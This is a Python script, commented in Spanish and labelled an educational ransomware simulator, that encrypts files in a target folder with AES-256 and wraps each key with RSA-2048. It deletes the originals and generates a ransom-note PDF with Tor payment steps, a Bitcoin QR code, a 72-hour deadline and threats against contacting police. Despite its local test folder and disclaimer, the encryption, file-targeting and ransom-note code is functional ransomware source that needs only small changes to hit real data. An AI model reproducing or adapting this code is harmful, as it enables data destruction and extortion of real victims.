#!/usr/bin/env python3
"""
SIMULADOR EDUCATIVO - INTERFAZ PROFESIONAL + PDF DE RESCATE
Flujo correcto: AES-256 (datos) → RSA-2048 (clave AES)
"""

import os
import time
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import hashes
import secrets
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table as PDFTable, Image
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT
import qrcode
from io import BytesIO

# ================= CONFIGURACIÓN =================
TARGET_DIR = "./test_files/"
RSA_PRIVATE_KEY = "./private_key.pem"
RSA_PUBLIC_KEY = "./public_key.pem"
README_FILE = "./README_RECOVER.txt"
REPORT_FILE = "./INSTRUCCIONES_RESCATE.pdf"
BOX_WIDTH = 60

TARGET_EXTENSIONS = {
    '.pdf', '.doc', '.docx', '.ppt', '.pptx', '.xls', '.xlsx', '.odt', '.ods', '.odp', 
    '.txt', '.rtf', '.tex', '.md', '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff', 
    '.svg', '.raw', '.cr2', '.nef', '.arw', '.webp', '.ico', '.psd', '.zip', '.rar', 
    '.7z', '.tar', '.gz', '.bz2', '.xz', '.mp3', '.mp4', '.avi', '.mov', '.wmv', '.flv', 
    '.mkv', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.sql', '.db', '.mdb', '.accdb', 
    '.csv', '.json', '.xml', '.py', '.js', '.html', '.css', '.php', '.cpp', '.java', 
    '.c', '.h', '.exe', '.dll', '.msi', '.iso', '.dmg', '.pkg'
}

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class BoxChars:
    HORIZONTAL = '═'
    VERTICAL = '║'
    TOP_LEFT = '╔'
    TOP_RIGHT = '╗'
    BOTTOM_LEFT = '╚'
    BOTTOM_RIGHT = '╝'
    VERTICAL_LEFT = '╠'
    VERTICAL_RIGHT = '╣'
    HORIZONTAL_DOWN = '╦'
    HORIZONTAL_UP = '╩'
    CROSS = '╬'

class ProfessionalRansomwareSimulator:
    def __init__(self):
        self.stats = {
            'total_files': 0, 'encrypted_files': 0, 'ignored_files': 0,
            'start_time': None, 'end_time': None, 'file_types': {}, 'total_size': 0
        }
        self.rsa_private_key = None
        self.rsa_public_key = None

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_boxed(self, text, width, color, is_title=False):
        """Imprimir texto en una caja con estilo"""
        lines = text.split('\n')
        
        # Línea superior
        print(f"{color}{BoxChars.TOP_LEFT}{BoxChars.HORIZONTAL * (width-2)}{BoxChars.TOP_RIGHT}{Colors.RESET}")
        
        for line in lines:
            if is_title:
                # Centrar texto para títulos
                padded_line = line.center(width-2)
            else:
                # Alinear a la izquierda para contenido
                padded_line = f" {line.ljust(width-3)}"
            
            print(f"{color}{BoxChars.VERTICAL}{Colors.RESET}{padded_line}{color}{BoxChars.VERTICAL}{Colors.RESET}")
        
        # Línea inferior
        print(f"{color}{BoxChars.BOTTOM_LEFT}{BoxChars.HORIZONTAL * (width-2)}{BoxChars.BOTTOM_RIGHT}{Colors.RESET}")

    def print_header(self):
        """Imprimir encabezado del simulador"""
        self.clear_screen()
        
        # Título principal
        title = f"{Colors.BOLD}{Colors.MAGENTA}         🔒 SIMULADOR EDUCATIVO DE RANSOMWARE 🔒          {Colors.RESET}"
        self.print_boxed(title, BOX_WIDTH, Colors.MAGENTA, True)
        
        # Advertencia
        warning = f"{Colors.YELLOW}  ⚠️  ADVERTENCIA: Este es un entorno educativo controlado {Colors.RESET}"
        self.print_boxed(warning, BOX_WIDTH, Colors.YELLOW, True)

    def show_menu(self):
        """Mostrar menú principal"""
        menu_title = f"{Colors.BOLD}{Colors.MAGENTA}                    🎯 MENÚ PRINCIPAL                     {Colors.RESET}"
        self.print_boxed(menu_title, BOX_WIDTH, Colors.MAGENTA, True)
        
        menu_items = [
            f"{Colors.GREEN} 1.{Colors.RESET} Ejecutar simulación completa ransomeware             ",
            f"{Colors.GREEN} 2.{Colors.RESET} Configuración técnica del sistema                    ",
            f"{Colors.GREEN} 3.{Colors.RESET} Salir del programa                                   ",
        ]
        menu_text = "\n".join(menu_items)
        self.print_boxed(menu_text, BOX_WIDTH, Colors.MAGENTA, False)

    def get_user_choice(self):
        """Obtener selección del usuario"""
        while True:
            try:
                choice = input(f"{Colors.BOLD}{Colors.CYAN}Seleccione una opción (1-3): {Colors.RESET}").strip()
                if choice in ['1', '2', '3']:
                    return choice
                else:
                    print(f"{Colors.RED}❌ Opción no válida. Por favor seleccione 1, 2 o 3.{Colors.RESET}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 ¡Hasta pronto!{Colors.RESET}")
                return '3'

    def generate_rsa_keys(self):
        """Generar claves RSA para el cifrado híbrido"""
        print(f"{Colors.CYAN}🔑 Generando claves RSA-2048...{Colors.RESET}")
        for i in range(5):
            print(f"{Colors.YELLOW}[{'█' * (i+1)}{' ' * (4-i)}] {(i+1)*20}%{Colors.RESET}", end='\r')
            time.sleep(0.3)
        
        # Generar par de claves RSA
        self.rsa_private_key = rsa.generate_private_key(
            public_exponent=65537, key_size=2048, backend=default_backend()
        )
        self.rsa_public_key = self.rsa_private_key.public_key()
        
        # Guardar clave privada
        with open(RSA_PRIVATE_KEY, "wb") as f:
            f.write(self.rsa_private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        # Guardar clave pública
        with open(RSA_PUBLIC_KEY, "wb") as f:
            f.write(self.rsa_public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))
        
        print(f"{Colors.GREEN}✅ Claves RSA generadas correctamente{Colors.RESET}")

    def setup_test_environment(self):
        """Crear entorno de prueba"""
        try:
            if not os.path.exists(TARGET_DIR):
                os.makedirs(TARGET_DIR)
                sample_files = {
                    "documento_importante.pdf": "Contenido confidencial\n",
                    "foto_vacaciones.jpg": "Datos de imagen\n",
                    "base_datos.sql": "CREATE TABLE usuarios;\n",
                    "contrato.docx": "Documento contractual\n",
                    "backup.zip": "Archivo de respaldo\n"
                }
                for filename, content in sample_files.items():
                    with open(os.path.join(TARGET_DIR, filename), 'w') as f:
                        f.write(content)
                print(f"{Colors.GREEN}✅ Entorno de prueba creado{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.RED}❌ Error creando entorno: {str(e)}{Colors.RESET}")
            return False

    def should_encrypt(self, file_path):
        """Verificar si el archivo debe ser cifrado"""
        file_ext = os.path.splitext(file_path)[1].lower()
        return file_ext in TARGET_EXTENSIONS

    def encrypt_aes_key_with_rsa(self, aes_key):
        """Cifrar clave AES con RSA pública (Paso 3 del flujo)"""
        try:
            return self.rsa_public_key.encrypt(
                aes_key,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
        except Exception as e:
            print(f"{Colors.RED}❌ Error cifrando clave AES con RSA: {str(e)}{Colors.RESET}")
            return None

    def encrypt_file_hybrid(self, file_path):
        """
        Cifrado híbrido con flujo correcto:
        1. 📁 ARCHIVO ORIGINAL
        2. 🔐 AES-256 (Clave aleatoria) - Cifra los datos
        3. 🔒 RSA-2048 (Cifrar clave AES) - Protege la clave
        4. 💾 GUARDAR: [IV] + [clave_AES_cifrada] + [archivo_cifrado]
        """
        try:
            if not self.should_encrypt(file_path):
                return False

            # ==================== FASE 1: CIFRADO AES ====================
            # Paso 1: Generar clave AES aleatoria y IV
            aes_key = secrets.token_bytes(32)  # AES-256
            iv = secrets.token_bytes(16)       # Vector de inicialización

            # Paso 2: Cifrar el archivo con AES
            with open(file_path, 'rb') as f:
                plaintext = f.read()

            # Configurar cifrado AES en modo CBC
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            
            # Aplicar padding y cifrar
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(plaintext) + padder.finalize()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()

            # ==================== FASE 2: PROTECCIÓN RSA ====================
            # Paso 3: Cifrar la clave AES con RSA
            encrypted_aes_key = self.encrypt_aes_key_with_rsa(aes_key)
            if not encrypted_aes_key:
                return False

            # ==================== FASE 3: GUARDADO ====================
            # Paso 4: Guardar estructura: IV + clave_AES_cifrada + archivo_cifrado
            encrypted_path = file_path + ".encrypted"
            with open(encrypted_path, 'wb') as f:
                # IV (16 bytes) - necesario para AES-CBC
                f.write(iv)
                # Longitud de la clave AES cifrada (4 bytes)
                f.write(len(encrypted_aes_key).to_bytes(4, 'big'))
                # Clave AES cifrada con RSA
                f.write(encrypted_aes_key)
                # Datos del archivo cifrados con AES
                f.write(ciphertext)
            
            # Estadísticas
            file_size = os.path.getsize(file_path)
            self.stats['total_size'] += file_size
            file_ext = os.path.splitext(file_path)[1].lower()
            self.stats['file_types'][file_ext] = self.stats['file_types'].get(file_ext, 0) + 1
            
            # Eliminar archivo original
            os.remove(file_path)
            return True
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error en cifrado híbrido {file_path}: {str(e)}{Colors.RESET}")
            return False

    def generate_qr_code(self, data):
        """Generar código QR para Bitcoin"""
        qr = qrcode.QRCode(version=1, box_size=8, border=2)
        qr.add_data(data)
        qr.make(fit=True)
        qr_img = qr.make_image(fill_color="black", back_color="white")
        
        img_buffer = BytesIO()
        qr_img.save(img_buffer, format='PNG')
        img_buffer.seek(0)
        return img_buffer

    def generate_ransom_pdf(self):
        """Generar PDF de rescate profesional"""
        try:
            doc = SimpleDocTemplate(REPORT_FILE, pagesize=A4, topMargin=0.5*inch, bottomMargin=0.5*inch)
            styles = getSampleStyleSheet()
            story = []
            
            # Estilos personalizados
            title_style = ParagraphStyle(
                'Title',
                parent=styles['Heading1'],
                fontSize=16,
                textColor=colors.red,
                alignment=TA_CENTER,
                spaceAfter=12
            )
            
            warning_style = ParagraphStyle(
                'Warning',
                parent=styles['Normal'],
                textColor=colors.darkred,
                backColor=colors.lightyellow,
                borderPadding=6,
                borderColor=colors.red,
                borderWidth=1
            )
            
            # Título principal
            story.append(Paragraph("¡¡¡ TODOS SUS ARCHIVOS HAN SIDO CIFRADOS !!!", title_style))
            story.append(Spacer(1, 10))
            
            # Mensaje de advertencia
            warning_text = """
            <b>¿QUÉ HA PASADO?</b><br/>
            Sus archivos importantes han sido cifrados con algoritmos militares (RSA-2048 + AES-256). 
            Sin nuestra clave de descifrado, es <b>IMPOSSIBLE</b> recuperar sus datos.
            """
            story.append(Paragraph(warning_text, warning_style))
            story.append(Spacer(1, 15))
            
            # Estadísticas del ataque
            stats_data = [
                ['ESTADÍSTICAS DEL ATAQUE', ''],
                ['Archivos cifrados', str(self.stats['encrypted_files'])],
                ['Tipos de archivo', str(len(self.stats['file_types']))],
                ['Tamaño total', f"{self.stats['total_size'] / 1024 / 1024:.1f} MB"],
                ['Fecha del ataque', self.stats['start_time'].strftime("%d/%m/%Y %H:%M")],
                ['Tiempo límite', (self.stats['start_time'] + timedelta(hours=72)).strftime("%d/%m/%Y %H:%M")]
            ]
            
            stats_table = PDFTable(stats_data, colWidths=[2.5*inch, 2.5*inch])
            stats_table.setStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.darkred),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BACKGROUND', (0, 1), (-1, -1), colors.lightgrey),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ])
            story.append(stats_table)
            story.append(Spacer(1, 20))
            
            # Instrucciones de pago
            story.append(Paragraph("<b>INSTRUCCIONES PARA EL PAGO:</b>", styles['Heading2']))
            story.append(Spacer(1, 10))
            
            payment_steps = [
                ['PASO', 'INSTRUCCIÓN'],
                ['1', 'Descargar Tor Browser desde torproject.org'],
                ['2', 'Visitar: http://ransomware-payment.onion'],
                ['3', 'Pagar 0.1 BTC a la dirección indicada'],
                ['4', 'Subir el archivo de verificación'],
                ['5', 'Recibir clave de descifrado']
            ]
            
            payment_table = PDFTable(payment_steps, colWidths=[0.8*inch, 4.2*inch])
            payment_table.setStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.darkblue),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                ('BACKGROUND', (0, 1), (-1, -1), colors.lightblue),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ])
            story.append(payment_table)
            story.append(Spacer(1, 15))
            
            # Dirección Bitcoin y QR
            btc_address = "bc********************************"
            story.append(Paragraph(f"<b>DIRECCIÓN BITCOIN:</b> {btc_address}", styles['Normal']))
            story.append(Spacer(1, 10))
            
            # Código QR
            qr_data = f"bitcoin:{btc_address}?amount=0.1"
            qr_img = self.generate_qr_code(qr_data)
            story.append(Image(qr_img, width=1.5*inch, height=1.5*inch))
            story.append(Paragraph("<i>Escanee para pagar</i>", styles['Italic']))
            story.append(Spacer(1, 20))
            
            # Advertencias importantes
            story.append(Paragraph("<b>ADVERTENCIAS IMPORTANTES:</b>", styles['Heading2']))
            warnings = [
                "• NO reinicie el equipo - podría perder datos permanentemente",
                "• NO intente recuperar con herramientas de terceros",
                "• NO contacte a la policía - no pueden ayudarle",
                "• El precio se duplicará después de 72 horas",
                "• Después de 7 días, los archivos se eliminarán permanentemente"
            ]
            
            for warning in warnings:
                story.append(Paragraph(warning, styles['Normal']))
                story.append(Spacer(1, 5))
            
            story.append(Spacer(1, 15))
            
            # Nota educativa (discreta)
            edu_note = Paragraph(
                "<i><font color='gray' size='8'>"
                "NOTA EDUCATIVA: Este programa es un simulador de ransomware creado únicamente con fines académicos. "
                "Queda prohibido su uso con fines maliciosos o sin consentimiento del propietario del sistema. "
                "Este software está protegido por copyright © 2025 "
                "<a href='https://github.com/marichu-kt'>@marichu_kt</a>. "
                "Se prohíbe su modificación, redistribución o uso con fines distintos a los educativos. "
                "El autor no se responsabiliza de usos indebidos ni de daños derivados."
                "</font></i>",
                styles['Italic']
            )
            story.append(edu_note)
            
            doc.build(story)
            print(f"{Colors.GREEN}📄 PDF de rescate generado: {REPORT_FILE}{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error generando PDF: {str(e)}{Colors.RESET}")
            return False

    def show_professional_stats(self):
        """Estadísticas profesionales - SOLO se muestra con opción 2"""
        self.print_header()
        
        stats_title = f"{Colors.BOLD}{Colors.BLUE} 📊 Configuración del sistema:                           {Colors.RESET}"
        stats_list = [
            f"{Colors.GREEN} •{Colors.RESET} Directorio objetivo: {Colors.CYAN}{TARGET_DIR:<25}        {Colors.RESET}",
            f"{Colors.GREEN} •{Colors.RESET} Extensiones: {Colors.CYAN}{len(TARGET_EXTENSIONS)} tipos{' ':>25}        {Colors.RESET}",
            f"{Colors.GREEN} •{Colors.RESET} Algoritmo: {Colors.CYAN}RSA-2048 + AES-256{' ':>23}  {Colors.RESET}",
            f"{Colors.GREEN} •{Colors.RESET} Flujo: {Colors.CYAN}AES(datos) → RSA(clave){' ':>21}   {Colors.RESET}"
        ]
        stats_text = stats_title + "\n" + "\n".join(stats_list)
        self.print_boxed(stats_text, BOX_WIDTH, Colors.BLUE, False)
        
        input(f"\n{Colors.YELLOW}Presione Enter para continuar...{Colors.RESET}")

    def run_professional_simulation(self):
        """Ejecutar simulación profesional"""
        self.print_header()
        
        # Confirmación de seguridad
        confirm_title = f"{Colors.BOLD}{Colors.YELLOW} ☢️  Confirmación de seguridad:                           {Colors.RESET}"
        confirm_list = [
            f"{Colors.RED} •{Colors.RESET} ¿Está en un entorno controlado para educación?        ",
            f"{Colors.RED} •{Colors.RESET} NO ejecutar en sistemas de producción{' ':>15}{Colors.RESET}  "
        ]
        confirm_text = confirm_title + "\n" + "\n".join(confirm_list)
        self.print_boxed(confirm_text, BOX_WIDTH, Colors.YELLOW, False)
        
        confirm = input(f"{Colors.BOLD}Confirmar ejecución (s/n): {Colors.RESET}").strip().lower()
        if confirm != 's':
            print(f"{Colors.RED}❌ Simulación cancelada{Colors.RESET}")
            time.sleep(2)
            return
        
        # Preparar entorno
        print(f"\n{Colors.GREEN}🔄 Preparando entorno de prueba...{Colors.RESET}")
        if not self.setup_test_environment():
            return
        
        # Generar claves RSA
        self.generate_rsa_keys()
        
        self.stats['start_time'] = datetime.now()
        
        # Encontrar archivos
        files_to_process = []
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                full_path = os.path.join(root, file)
                if self.should_encrypt(full_path):
                    files_to_process.append(full_path)
        
        self.stats['total_files'] = len(files_to_process)
        
        if not files_to_process:
            print(f"{Colors.RED}❌ No hay archivos para cifrar{Colors.RESET}")
            return
        
        # Cifrado
        print(f"\n{Colors.BLUE}🔐 Cifrando {len(files_to_process)} archivos...{Colors.RESET}")
        print(f"{Colors.CYAN}Flujo: AES-256(datos) → RSA-2048(clave AES){Colors.RESET}")
        
        for i, file_path in enumerate(files_to_process):
            if self.encrypt_file_hybrid(file_path):
                self.stats['encrypted_files'] += 1
            progress = (i + 1) / len(files_to_process) * 100
            bars = "█" * int(progress / 5) + " " * (20 - int(progress / 5))
            print(f"{Colors.CYAN}[{bars}] {progress:.1f}%{Colors.RESET}", end='\r')
            time.sleep(0.1)
        
        print()  # Nueva línea después de la barra de progreso
        
        self.stats['end_time'] = datetime.now()
        
        # Generar PDF de rescate
        print(f"\n{Colors.YELLOW}📄 Generando instrucciones de rescate...{Colors.RESET}")
        self.generate_ransom_pdf()
        
        self.show_professional_summary()

    def show_professional_summary(self):
        """Resumen profesional - Sin información de configuración"""
        self.print_header()
        
        duration = (self.stats['end_time'] - self.stats['start_time']).total_seconds()
        
        summary_title = f"{Colors.BOLD}{Colors.GREEN} 📈 Resumen de la simulación:                            {Colors.RESET}"
        summary_list = [
            f"{Colors.GREEN} •{Colors.RESET} Archivos totales: {Colors.CYAN}{self.stats['total_files']:<15}                     {Colors.RESET}",
            f"{Colors.GREEN} •{Colors.RESET} Archivos cifrados: {Colors.CYAN}{self.stats['encrypted_files']:<14}                     {Colors.RESET}",
            f"{Colors.GREEN} •{Colors.RESET} Tamaño total: {Colors.CYAN}{self.stats['total_size'] / 1024 / 1024:.1f} MB{' ':>15}                   {Colors.RESET}",
            f"{Colors.GREEN} •{Colors.RESET} Tiempo de ejecución: {Colors.CYAN}{duration:.1f} segundos{' ':>10}           {Colors.RESET}",
        ]
        summary_text = summary_title + "\n" + "\n".join(summary_list)
        self.print_boxed(summary_text, BOX_WIDTH, Colors.GREEN, False)

        files_title = f"{Colors.BOLD}{Colors.GREEN} 📂 Archivos generados:                                  {Colors.RESET}"
        files_list = [
            f"{Colors.GREEN} •{Colors.RESET} {REPORT_FILE}                           ",
            f"{Colors.GREEN} •{Colors.RESET} {RSA_PRIVATE_KEY}                                     ",
        ]
        files_text = files_title + "\n" + "\n".join(files_list)
        self.print_boxed(files_text, BOX_WIDTH, Colors.GREEN, False)
        
        print(f"{Colors.GREEN}✅ Simulación completada correctamente{Colors.RESET}")
        print()
        
        input(f"{Colors.YELLOW}Presione Enter para continuar...{Colors.RESET}")

    def main_loop(self):
        """Bucle principal profesional"""
        while True:
            self.print_header()
            self.show_menu()
            
            choice = self.get_user_choice()
            
            if choice == "1":
                self.run_professional_simulation()
            elif choice == "2":
                self.show_professional_stats()
            elif choice == "3":
                print(f"\n{Colors.GREEN}👋 ¡Hasta pronto!{Colors.RESET}")
                break

def main():
    simulator = ProfessionalRansomwareSimulator()
    simulator.main_loop()

if __name__ == "__main__":
    main()